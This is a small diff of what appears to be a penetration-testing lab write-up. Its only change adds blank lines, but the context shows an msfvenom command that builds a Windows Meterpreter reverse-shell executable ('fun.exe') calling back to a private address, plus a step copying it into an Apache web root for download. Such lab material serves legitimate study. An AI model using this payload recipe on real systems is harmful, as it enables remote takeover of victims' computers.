@@ -41,6 +41,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
 
 copy the fun.exe into the apache /var/www/html folder
+
+
 ![Screenshot 2025-04-07 111757](https://github.com/user-attachments/assets/9b463b17-fee2-4c8c-9bea-0deedb00779a)
 
 
